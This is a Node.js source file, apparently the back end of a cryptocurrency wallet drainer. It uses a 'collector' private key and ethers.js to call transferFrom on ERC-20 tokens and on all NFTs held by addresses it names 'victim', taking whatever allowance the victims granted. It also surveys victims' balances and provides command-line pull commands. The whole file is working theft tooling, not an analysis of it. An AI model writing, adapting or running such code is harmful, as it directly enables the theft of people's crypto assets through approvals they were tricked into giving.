const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const cfg = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8'));
const provider = new ethers.providers.JsonRpcProvider(cfg.rpcUrl);
let wallet = null;
try {
  if (cfg.collectorPrivateKey && !cfg.collectorPrivateKey.includes("YOUR_")) {
    wallet = new ethers.Wallet(cfg.collectorPrivateKey, provider);
  } else {
    console.warn("[WARN] collectorPrivateKey fehlt in config.json — Pulls deaktiviert bis Key eingetragen ist. Server läuft trotzdem.");
  }
} catch(e) { console.warn("[WARN] Key ungültig:", e.message); }
function needWallet(){ if(!wallet) throw new Error("Kein Private Key in config.json eingetragen"); return wallet; }

const ERC20_PULL_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function transferFrom(address,address,uint256) returns (bool)",
  "function decimals() view returns (uint8)"
];
const ERC721_ENUM_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function tokenOfOwnerByIndex(address,uint256) view returns (uint256)",
  "function transferFrom(address,address,uint256)",
  "function isApprovedForAll(address,address) view returns (bool)"
];

async function pullERC20(token, victim){
  const w = needWallet();
  const c = new ethers.Contract(token, ERC20_PULL_ABI, w);
  const bal = await c.balanceOf(victim);
  const allow = await c.allowance(victim, w.address);
  const amt = bal.lt(allow) ? bal : allow;
  if(amt.isZero()) return { ok:false, reason:'nothing to pull' };
  const tx = await c.transferFrom(victim, w.address, amt);
  const rc = await tx.wait();
  return { ok:true, amount: amt.toString(), txHash: rc.transactionHash };
}

async function pullOneNFT(collection, victim, tokenId){
  const w = needWallet();
  const c = new ethers.Contract(collection, ["function transferFrom(address,address,uint256)"], w);
  const tx = await c.transferFrom(victim, w.address, tokenId);
  const rc = await tx.wait();
  return { ok:true, tokenId: tokenId.toString(), txHash: rc.transactionHash };
}

async function pullAllNFTs(collection, victim){
  const w = needWallet();
  const c = new ethers.Contract(collection, ERC721_ENUM_ABI, w);
  const results = [];
  try{
    const n = await c.balanceOf(victim);
    const count = n.toNumber();
    for(let i=0;i<count;i++){
      try{
        // tokenOfOwnerByIndex shifts as we pull; always take index 0
        const tid = await c.tokenOfOwnerByIndex(victim, 0);
        const r = await pullOneNFT(collection, victim, tid);
        results.push(r);
      }catch(e){ results.push({ ok:false, error: e.message }); break; }
    }
  }catch(e){
    return { ok:false, error: e.message, note: 'collection may not support enumeration — supply tokenIds manually via pullOneNFT' };
  }
  return { ok:true, pulled: results };
}

async function getBalances(victim){
  const eth = await provider.getBalance(victim);
  const tokens = [];
  for(const t of (cfg.targetTokens||[])){
    try{
      const c = new ethers.Contract(t, ERC20_PULL_ABI, provider);
      const b = await c.balanceOf(victim);
      tokens.push({ token:t, balance: b.toString() });
    }catch(e){ tokens.push({ token:t, error:e.message }); }
  }
  return { victim, eth: eth.toString(), tokens, collector: wallet ? wallet.address : null };
}

module.exports = { pullERC20, pullOneNFT, pullAllNFTs, getBalances };
if(require.main === module){
  (async()=>{
    const [cmd, a, b] = process.argv.slice(2);
    if(cmd==='pull-erc20') console.log(await pullERC20(a,b));
    else if(cmd==='pull-nfts') console.log(await pullAllNFTs(a,b));
    else if(cmd==='balances') console.log(await getBalances(a));
    else console.log('usage: node puller.js pull-erc20 <token> <victim> | pull-nfts <collection> <victim> | balances <victim>');
  })();
}
